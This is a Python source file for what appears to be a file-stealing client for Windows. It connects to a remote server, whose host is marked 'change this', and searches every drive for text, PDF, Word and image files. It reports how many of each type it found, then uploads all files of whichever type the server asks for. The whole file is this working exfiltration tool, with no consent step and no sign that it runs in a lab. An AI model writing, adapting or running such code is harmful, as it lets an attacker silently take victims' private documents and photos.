## buffer class for better data handling
class Buffer:
    def __init__(self,s):
        '''Buffer a pre-created socket.
        '''
        self.sock = s
        self.buffer = b''

    def get_bytes(self,n):
        '''Read exactly n bytes from the buffered socket.
           Return remaining buffer if <n bytes remain and socket closes.
        '''
        while len(self.buffer) < n:
            data = self.sock.recv(1024)
            if not data:
                data = self.buffer
                self.buffer = b''
                return data
            self.buffer += data
        # split off the message bytes from the buffer.
        data,self.buffer = self.buffer[:n],self.buffer[n:]
        return data

    def put_bytes(self,data):
        self.sock.sendall(data)

    def get_utf8(self):
        '''Read a null-terminated UTF8 data string and decode it.
           Return an empty string if the socket closes before receiving a null.
        '''
        while b'\x00' not in self.buffer:
            data = self.sock.recv(1024)
            if not data:
                return ''
            self.buffer += data
        # split off the string from the buffer.
        data,_,self.buffer = self.buffer.partition(b'\x00')
        return data.decode()

    def put_utf8(self,s):
        if '\x00' in s:
            raise ValueError('string contains delimiter(null)')
        self.sock.sendall(s.encode() + b'\x00')

##import shit
import os
import win32api
import socket
import time

#Buffer size
BUFFER_SIZE = 4096
## host and port of server 
host = "127.0.0.1" #change this
port = 5001

#list for stroing file location
txt = []
jpg = []
pdf = []
word = []

##upload function
def upload(s,file_t):
    with s:
        sbuf = Buffer(s)
        for f in file_t:
            sbuf.put_utf8(f)
            file_size = os.path.getsize(f)
            sbuf.put_utf8(str(file_size))

            with open(f,"rb") as t:
                sbuf.put_bytes(t.read())
                

##return extension of files
def get_ext(file_path):
    ext = file_path.split('.')[-1]
    return ext

##gather all info into lists
def gather_info():
    drivers = []
    drivers = win32api.GetLogicalDriveStrings().split("\x00")[:-1]
    ##looping through drivers
    for div in drivers:
        try:
            for root,dirs,files in os.walk(div,topdown=True):
                for file in files:
            
                    file_path = os.path.join(root,file)
                    if get_ext(file_path) == "txt":
                        txt.append(file_path)

                    elif get_ext(file_path) == "pdf":
                        pdf.append(file_path)
                    
                    elif get_ext(file_path) == "docx" or get_ext(file_path) == "doc":
                        word.append(file_path)

                    
                    elif get_ext(file_path) == "png" or get_ext(file_path) == "PNG" or get_ext(file_path) == "jpg" or get_ext(file_path) == "JPG" or get_ext(file_path) == "jpeg" or get_ext(file_path) == "JPEG":
                        
                        jpg.append(file_path)
        except:
            pass


#main function
def main():
    ##make a connection to the server 
    s =socket.socket()
    s.connect((host,port))

    ##start gathering info
    gather_info()

    ## time to sleep
    time.sleep(3)

    ##count
    txt_count = str(len(txt))
    word_count = str(len(word))
    pdf_count = str(len(pdf))
    jpg_count = str(len(jpg))

    ##send the countings
    s.send(f"{txt_count}".encode())
    time.sleep(1)
    s.send(f"{word_count}".encode())
    time.sleep(1)
    s.send(f"{pdf_count}".encode())
    time.sleep(1)
    s.send(f"{jpg_count}".encode())
    
    ##receive command from server
    file_type = s.recv(BUFFER_SIZE).decode()
    file_type = str(file_type)

    ##start uploading
    if file_type == "txt":
        upload(s,txt)
    elif file_type == "pdf":
        upload(s,pdf)
    elif file_type == "word":
        upload(s,word)
    elif file_type == "image":
        upload(s,jpg)




if __name__ == "__main__":
    main()